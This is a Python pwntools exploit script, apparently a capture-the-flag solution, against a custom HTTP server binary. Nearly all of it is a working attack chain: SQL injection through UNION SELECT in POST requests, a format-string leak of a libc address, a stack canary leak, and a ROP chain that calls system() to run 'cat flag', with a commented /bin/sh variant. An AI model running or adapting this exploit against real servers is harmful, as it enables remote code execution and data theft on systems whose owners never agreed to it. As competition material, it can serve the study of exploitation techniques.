from pwn import *
import sys
import requests

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = remote("127.0.0.1",8080)
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./server_strip")
else:
	p = remote(sys.argv[1],sys.argv[2])
	libc = ELF("./libc.so.6")
	elf = ELF("./server_strip")

def debugf():
	gdb.attach(p,"b *0x402B21\nb *0x402bf2\nb *0x402DDA")

def sendpayload(payload):
	data = ("POST /cart.html HTTP/1.1\r\n",
        "Host: 127.0.0.1\r\n",
        "Content-Length: {length}\r\n".format(length=len(payload)),
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "\r\n",
        payload)
	data = ''.join(data)
	p.send(data)
	p.recvuntil('</html>')

def sendpayload2(payload):
	data = ("POST /product.html HTTP/1.1\r\n",
        "Host: 127.0.0.1\r\n",
        "Content-Length: {length}\r\n".format(length=len(payload)),
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "\r\n",
        payload)
	data = ''.join(data)
	p.send(data)
	p.recvuntil('</html>')

def generate_payload(payload):
	data = ("POST /product.html HTTP/1.1\r\n",
        "Host: 127.0.0.1\r\n",
        "Content-Length: {length}\r\n".format(length=len(payload)),
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "\r\n",
        payload)
	data = ''.join(data)
	return data

def gen_payload(index,value):
	payload = ""
	#for i in range(8):
	
	
#payload = "33333333=2222222\x80\x90&cargo=11111111) union select ('aaaabbbb\x90'"
#9 -> 15
payload = "33333333=2222222&cargo=11111111) union select ('%75$p'"
#load_file('/opt/xnuca/flag.txt'"
#SELECT * FROM cargo where cargo_id=12121 union select 'aaaa'

sendpayload(payload)
res = p.recv(20)
leak_addr = int(res,16)
libc.address = leak_addr - libc.symbols["__libc_start_main"] - 240
log.success("libc_base:"+hex(libc.address))

if debug:
	p = remote("127.0.0.1",8080)
else:
	p = remote(sys.argv[1],sys.argv[2])
#context.log_level = "debug"
payload1 = "a"*(0x90-0x18+1 - 4) + "b"*4
#payload1 = "aaaaaaaabbbbbbbbcccccccc"

payload = "222=111&id=1 union select '{payload1}',2,3,'aaaaaaaabbbbbbbb'".format(payload1=payload1)
sendpayload2(payload)#+generate_payload(payload))
#sendpayload2(payload)
p.recvuntil("bbbb")
canary = u64(p.recv(7).rjust(8,"\x00"))
log.success("canary:"+hex(canary))
#p.interactive()
#0x9a20f082e77c3600

one_gadget = libc.address + 0xf1147
if debug:
	p = remote("127.0.0.1",8080)
else:
	p = remote(sys.argv[1],sys.argv[2])
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
pop_rdi_ret = 0x0000000000403823
#payload2 = "overdue" + "a"*(0x90-0x18-len("overdue")) + p64(canary) + "a"*0x18 + p64(pop_rdi_ret) + p64(binsh) + p64(system_addr)
pop_rsi_r15_ret = 0x0000000000403821
puts_addr = elf.plt["puts"]
bss_addr = 0x609000
pop_rsi_r15_ret = 0x0000000000403821
payload2 = "overdue" + "a"*(0x90-0x18-len("overdue")) + p64(canary) + "a"*0x18 + p64(pop_rdi_ret) + p64(libc.symbols["environ"]) + p64(libc.symbols["puts"])
payload = "222=111&id=1 union select 0x{payload},2,3,'aaaaaaaabbbbbbbb'".format(payload=payload2.encode("hex"))
sendpayload2(payload)


p.recvuntil("aaaaaaaabbbbbbbb",drop=True)
p.recvuntil(" ")
stack_addr = u64(p.recv(6).ljust(8,"\x00"))
log.success("stack_addr:"+hex(stack_addr))

if debug:
	p = remote("127.0.0.1",8080)
else:
	p = remote(sys.argv[1],sys.argv[2])
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
pop_rdi_ret = 0x0000000000403823
#payload2 = "overdue" + "a"*(0x90-0x18-len("overdue")) + p64(canary) + "a"*0x18 + p64(pop_rdi_ret) + p64(binsh) + p64(system_addr)
pop_rsi_r15_ret = 0x0000000000403821
puts_addr = elf.plt["puts"]
offset = 0x7fffffffdbf0 - 0x7fffffffde88 + 0xb0 - 0xc
order = "cat flag"
payload2 = "overdue" + "a"*(0x90-0x18-len("overdue")) + p64(canary) + "ab12" + order.ljust(0x14,"\x00")
payload2 += p64(pop_rdi_ret) + p64(stack_addr + offset ) + p64(libc.symbols["system"])
#cat /
#context.log_level = "debug"

payload = "222=111&id=1 union select 0x{payload},2,3,'aaaaaaaabbbbbbbb'".format(payload=payload2.encode("hex"))
sendpayload2(payload)
p.recvuntil("aaaaaaaabbbbbbbb",drop=True)
p.recvuntil(" ")

#p.interactive()
p.interactive()
